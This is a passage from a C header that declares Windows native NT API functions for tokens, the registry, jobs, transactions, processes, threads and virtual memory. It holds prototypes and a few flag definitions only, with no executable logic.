    _In_ MEMORY_PARTITION_INFORMATION_CLASS PartitionInformationClass,
    _In_ PVOID PartitionInformation,
    _In_ ULONG PartitionInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePartition(
    _Out_ PHANDLE PartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG PreferredNode);

/************************************************************************************
*
* Token API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtAccessCheck(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ PGENERIC_MAPPING GenericMapping,
    _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
    _Inout_ PULONG PrivilegeSetLength,
    _Out_ PACCESS_MASK GrantedAccess,
    _Out_ PNTSTATUS AccessStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtAccessCheckByType(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_opt_ PSID PrincipalSelfSid,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_reads_(ObjectTypeListLength) POBJECT_TYPE_LIST ObjectTypeList,
    _In_ ULONG ObjectTypeListLength,
    _In_ PGENERIC_MAPPING GenericMapping,
    _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
    _Inout_ PULONG PrivilegeSetLength,
    _Out_ PACCESS_MASK GrantedAccess,
    _Out_ PNTSTATUS AccessStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtAccessCheckByTypeResultList(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_opt_ PSID PrincipalSelfSid,
    _In_ HANDLE ClientToken,
    _In_ ACCESS_MASK DesiredAccess,
    _In_reads_(ObjectTypeListLength) POBJECT_TYPE_LIST ObjectTypeList,
    _In_ ULONG ObjectTypeListLength,
    _In_ PGENERIC_MAPPING GenericMapping,
    _Out_writes_bytes_(*PrivilegeSetLength) PPRIVILEGE_SET PrivilegeSet,
    _Inout_ PULONG PrivilegeSetLength,
    _Out_writes_(ObjectTypeListLength) PACCESS_MASK GrantedAccess,
    _Out_writes_(ObjectTypeListLength) PNTSTATUS AccessStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcessToken(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcessTokenEx(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtDuplicateToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN EffectiveOnly,
    _In_ TOKEN_TYPE TokenType,
    _Out_ PHANDLE NewTokenHandle);

#define DISABLE_MAX_PRIVILEGE   0x1 // winnt
#define SANDBOX_INERT           0x2 // winnt
#define LUA_TOKEN               0x4
#define WRITE_RESTRICT          0x8

NTSYSAPI
NTSTATUS
NTAPI
NtFilterToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ULONG Flags,
    _In_opt_ PTOKEN_GROUPS SidsToDisable,
    _In_opt_ PTOKEN_PRIVILEGES PrivilegesToDelete,
    _In_opt_ PTOKEN_GROUPS RestrictedSids,
    _Out_ PHANDLE NewTokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtImpersonateAnonymousToken(
    _In_ HANDLE ThreadHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_(TokenInformationLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _In_reads_bytes_(TokenInformationLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThreadToken(
    _In_ HANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ BOOLEAN OpenAsSelf,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThreadTokenEx(
    _In_ HANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ BOOLEAN OpenAsSelf,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtAdjustPrivilegesToken(
    _In_ HANDLE TokenHandle,
    _In_ BOOLEAN DisableAllPrivileges,
    _In_opt_ PTOKEN_PRIVILEGES NewState,
    _In_ ULONG BufferLength,
    _Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,
    _Out_ _When_(PreviousState == NULL, _Out_opt_) PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtAdjustGroupsToken(
    _In_ HANDLE TokenHandle,
    _In_ BOOLEAN ResetToDefault,
    _In_opt_ PTOKEN_GROUPS NewState,
    _In_opt_ ULONG BufferLength,
    _Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_GROUPS PreviousState,
    _Out_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCompareTokens(
    _In_ HANDLE FirstTokenHandle,
    _In_ HANDLE SecondTokenHandle,
    _Out_ PBOOLEAN Equal);

NTSYSAPI
NTSTATUS
NTAPI
NtPrivilegeCheck(
    _In_ HANDLE ClientToken,
    _Inout_ PPRIVILEGE_SET RequiredPrivileges,
    _Out_ PBOOLEAN Result);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateToken(
    _Out_ PHANDLE TokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TOKEN_TYPE TokenType,
    _In_ PLUID AuthenticationId,
    _In_ PLARGE_INTEGER ExpirationTime,
    _In_ PTOKEN_USER User,
    _In_ PTOKEN_GROUPS Groups,
    _In_ PTOKEN_PRIVILEGES Privileges,
    _In_opt_ PTOKEN_OWNER Owner,
    _In_ PTOKEN_PRIMARY_GROUP PrimaryGroup,
    _In_opt_ PTOKEN_DEFAULT_DACL DefaultDacl,
    _In_ PTOKEN_SOURCE TokenSource);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateTokenEx(
    _Out_ PHANDLE TokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TOKEN_TYPE TokenType,
    _In_ PLUID AuthenticationId,
    _In_ PLARGE_INTEGER ExpirationTime,
    _In_ PTOKEN_USER User,
    _In_ PTOKEN_GROUPS Groups,
    _In_ PTOKEN_PRIVILEGES Privileges,
    _In_opt_ PVOID UserAttributes, // points to TOKEN_SECURITY_ATTRIBUTES_INFORMATION
    _In_opt_ PVOID DeviceAttributes, // points to PTOKEN_SECURITY_ATTRIBUTES_INFORMATION
    _In_opt_ PTOKEN_GROUPS DeviceGroups,
    _In_opt_ PTOKEN_MANDATORY_POLICY TokenMandatoryPolicy,
    _In_opt_ PTOKEN_OWNER Owner,
    _In_ PTOKEN_PRIMARY_GROUP PrimaryGroup,
    _In_opt_ PTOKEN_DEFAULT_DACL DefaultDacl,
    _In_ PTOKEN_SOURCE TokenSource);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateLowBoxToken(
    _Out_ PHANDLE TokenHandle,
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PSID PackageSid,
    _In_ ULONG CapabilityCount,
    _In_reads_opt_(CapabilityCount) PSID_AND_ATTRIBUTES Capabilities,
    _In_ ULONG HandleCount,
    _In_reads_opt_(HandleCount) HANDLE *Handles);

/************************************************************************************
*
* Registry API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateKey(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Reserved_ ULONG TitleIndex,
    _In_opt_ PUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _Out_opt_ PULONG Disposition);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateKeyTransacted(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Reserved_ ULONG TitleIndex,
    _In_opt_ PUNICODE_STRING Class,
    _In_ ULONG CreateOptions,
    _In_ HANDLE TransactionHandle,
    _Out_opt_ PULONG Disposition);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKey(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyEx(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG OpenOptions);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyTransacted(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE TransactionHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenKeyTransactedEx(
    _Out_ PHANDLE KeyHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG OpenOptions,
    _In_ HANDLE TransactionHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryKey(
    _In_ HANDLE KeyHandle,
    _In_ KEY_INFORMATION_CLASS KeyInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_INFORMATION_CLASS KeyInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateValueKey(
    _In_ HANDLE KeyHandle,
    _In_ ULONG Index,
    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyValueInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName,
    _In_ KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    _Out_writes_bytes_opt_(Length) PVOID KeyValueInformation,
    _In_ ULONG Length,
    _Out_ PULONG ResultLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryMultipleValueKey(
    _In_ HANDLE KeyHandle,
    _Inout_updates_(EntryCount) PKEY_VALUE_ENTRY ValueEntries,
    _In_ ULONG EntryCount,
    _Out_writes_bytes_(*BufferLength) PVOID ValueBuffer,
    _Inout_ PULONG BufferLength,
    _Out_opt_ PULONG RequiredBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName,
    _In_opt_ ULONG TitleIndex,
    _In_ ULONG Type,
    _In_reads_bytes_opt_(DataSize) PVOID Data,
    _In_ ULONG DataSize);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteKey(
    _In_ HANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteValueKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING ValueName);

NTSYSAPI
NTSTATUS
NTAPI
NtRenameKey(
    _In_ HANDLE KeyHandle,
    _In_ PUNICODE_STRING NewName);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationKey(
    _In_ HANDLE KeyHandle,
    _In_ KEY_SET_INFORMATION_CLASS KeySetInformationClass,
    _In_reads_bytes_(KeySetInformationLength) PVOID KeySetInformation,
    _In_ ULONG KeySetInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushKey(
    _In_ HANDLE KeyHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtCompressKey(
    _In_ HANDLE Key);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKey(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKey2(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadKeyEx(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile,
    _In_ ULONG Flags,
    _In_opt_ HANDLE TrustClassKey,
    _In_opt_ HANDLE Event,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE RootHandle,
    _Out_opt_ PIO_STATUS_BLOCK IoStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtSaveKey(
    _In_ HANDLE KeyHandle,
    _In_ HANDLE FileHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSaveKeyEx(
    _In_ HANDLE KeyHandle,
    _In_ HANDLE FileHandle,
    _In_ ULONG Format);

NTSYSAPI
NTSTATUS
NTAPI
NtUnloadKey(
    _In_ POBJECT_ATTRIBUTES TargetKey);

NTSYSAPI
NTSTATUS
NTAPI
NtUnloadKey2(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtUnloadKeyEx(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_opt_ HANDLE Event);

NTSYSAPI
NTSTATUS
NTAPI
NtNotifyChangeKey(
    _In_ HANDLE KeyHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG CompletionFilter,
    _In_ BOOLEAN WatchTree,
    _Out_writes_bytes_opt_(BufferSize) PVOID Buffer,
    _In_ ULONG BufferSize,
    _In_ BOOLEAN Asynchronous);

NTSYSAPI
NTSTATUS
NTAPI
NtLockRegistryKey(
    _In_ HANDLE KeyHandle);

/************************************************************************************
*
* Job API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtAssignProcessToJobObject(
    _In_ HANDLE JobHandle,
    _In_ HANDLE ProcessHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateJobObject(
    _Out_ PHANDLE JobHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateJobSet(
    _In_ ULONG NumJob,
    _In_reads_(NumJob) PJOB_SET_ARRAY UserJobSet,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtIsProcessInJob(
    _In_ HANDLE ProcessHandle,
    _In_opt_ HANDLE JobHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenJobObject(
    _Out_ PHANDLE JobHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationJobObject(
    _In_opt_ HANDLE JobHandle,
    _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
    _Out_writes_bytes_(JobObjectInformationLength) PVOID JobObjectInformation,
    _In_ ULONG JobObjectInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationJobObject(
    _In_ HANDLE JobHandle,
    _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
    _In_reads_bytes_(JobObjectInformationLength) PVOID JobObjectInformation,
    _In_ ULONG JobObjectInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateJobObject(
    _In_ HANDLE JobHandle,
    _In_ NTSTATUS ExitStatus);

/************************************************************************************
*
* Session API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS 
NTAPI 
NtOpenSession(
    _Out_ PHANDLE SessionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

/************************************************************************************
*
* IO Completion API.
*
************************************************************************************/

typedef enum _IO_COMPLETION_INFORMATION_CLASS {
    IoCompletionBasicInformation
} IO_COMPLETION_INFORMATION_CLASS;

typedef struct _IO_COMPLETION_BASIC_INFORMATION {
    LONG Depth;
} IO_COMPLETION_BASIC_INFORMATION, *PIO_COMPLETION_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateIoCompletion(
    _Out_ PHANDLE IoCompletionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ ULONG Count);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenIoCompletion(
    _Out_ PHANDLE IoCompletionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _In_ IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass,
    _Out_writes_bytes_(IoCompletionInformationLength) PVOID IoCompletionInformation,
    _In_ ULONG IoCompletionInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _In_opt_ PVOID KeyContext,
    _In_opt_ PVOID ApcContext,
    _In_ NTSTATUS IoStatus,
    _In_ ULONG_PTR IoStatusInformation);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIoCompletionEx(
    _In_ HANDLE IoCompletionHandle,
    _In_ HANDLE IoCompletionPacketHandle,
    _In_opt_ PVOID KeyContext,
    _In_opt_ PVOID ApcContext,
    _In_ NTSTATUS IoStatus,
    _In_ ULONG_PTR IoStatusInformation);

NTSYSAPI
NTSTATUS
NTAPI
NtRemoveIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _Out_ PVOID *KeyContext,
    _Out_ PVOID *ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER Timeout);

/************************************************************************************
*
* Transactions API.
*
************************************************************************************/

//TmTx
NTSYSAPI
NTSTATUS
NTAPI
NtCreateTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ ULONG IsolationLevel,
    _In_opt_ ULONG IsolationFlags,
    _In_opt_ PLARGE_INTEGER Timeout,
    _In_opt_ PUNICODE_STRING Description);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtRollbackTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait);

NTSYSAPI
NTSTATUS
NTAPI
NtCommitTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait);

NTSYSAPI
NTSTATUS
NTAPI
NtFreezeTransactions(
    _In_ PLARGE_INTEGER FreezeTimeout,
    _In_ PLARGE_INTEGER ThawTimeout);

NTSYSAPI
NTSTATUS
NTAPI
NtThawTransactions(
    VOID);

//TmRm
NTSYSAPI
NTSTATUS
NTAPI
NtCreateResourceManager(
    _Out_ PHANDLE ResourceManagerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE TmHandle,
    _In_opt_ LPGUID ResourceManagerGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ PUNICODE_STRING Description);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenResourceManager(
    _Out_ PHANDLE ResourceManagerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE TmHandle,
    _In_opt_ LPGUID ResourceManagerGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

//TmEn
NTSYSAPI
NTSTATUS
NTAPI
NtCreateEnlistment(
    _Out_ PHANDLE EnlistmentHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE ResourceManagerHandle,
    _In_ HANDLE TransactionHandle,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ ULONG CreateOptions,
    _In_ NOTIFICATION_MASK NotificationMask,
    _In_opt_ PVOID EnlistmentKey);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenEnlistment(
    _Out_ PHANDLE EnlistmentHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE ResourceManagerHandle,
    _In_ LPGUID EnlistmentGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

//TmTm
NTSYSAPI
NTSTATUS
NTAPI
NtCreateTransactionManager(
    _Out_ PHANDLE TmHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PUNICODE_STRING LogFileName,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ ULONG CommitStrength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenTransactionManager(
    _Out_ PHANDLE TmHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PUNICODE_STRING LogFileName,
    _In_opt_ LPGUID TmIdentity,
    _In_opt_ ULONG OpenOptions);

/************************************************************************************
*
* Process and Thread API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateUserProcess(
    _Out_ PHANDLE ProcessHandle,
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK ProcessDesiredAccess,
    _In_ ACCESS_MASK ThreadDesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
    _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
    _In_ ULONG ProcessFlags,
    _In_ ULONG ThreadFlags,
    _In_opt_ PVOID ProcessParameters,
    _Inout_ PPS_CREATE_INFO CreateInfo,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcess(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateProcess(
    _In_opt_ HANDLE ProcessHandle,
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtSuspendProcess(
    _In_ HANDLE ProcessHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtResumeProcess(
    _In_ HANDLE ProcessHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtSuspendThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount);

NTSYSAPI
NTSTATUS
NTAPI
NtResumeThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThread(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateThread(
    _In_opt_ HANDLE ThreadHandle,
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtImpersonateThread(
    _In_ HANDLE ServerThreadHandle,
    _In_ HANDLE ClientThreadHandle,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos);

NTSYSAPI
NTSTATUS
NTAPI
NtSetContextThread(
    _In_ HANDLE ThreadHandle,
    _In_ PCONTEXT ThreadContext);

NTSYSAPI
NTSTATUS
NTAPI
NtGetContextThread(
    _In_ HANDLE ThreadHandle,
    _Inout_ PCONTEXT ThreadContext);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _Out_writes_bytes_(ThreadInformationLength) PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _In_reads_bytes_(ThreadInformationLength) PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _In_reads_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength);

typedef VOID(*PPS_APC_ROUTINE) (
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSYSAPI
NTSTATUS
NTAPI
NtQueueApcThread(
    _In_ HANDLE ThreadHandle,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSYSAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE UserApcReserveHandle,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSYSAPI
NTSTATUS
NTAPI
NtYieldExecution(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
NtTestAlert(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateProcessEx(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ ULONG Flags,
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _In_ BOOLEAN InJob);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateThreadEx(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags, //THREAD_CREATE_FLAGS_*
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

NTSYSAPI
ULONG
NTAPI
NtGetCurrentProcessorNumber(
    VOID);

/************************************************************************************
*
* License API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtQueryLicenseValue(
    _In_ PUNICODE_STRING ValueName,
    _Out_opt_ PULONG Type,
    _Out_writes_bytes_to_opt_(DataSize, *ResultDataSize) PVOID Data,
    _In_ ULONG DataSize,
    _Out_ PULONG ResultDataSize);

/************************************************************************************
*
* Virtual Memory API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect);

NTSYSAPI
NTSTATUS
NTAPI
NtFreeVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG FreeType);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
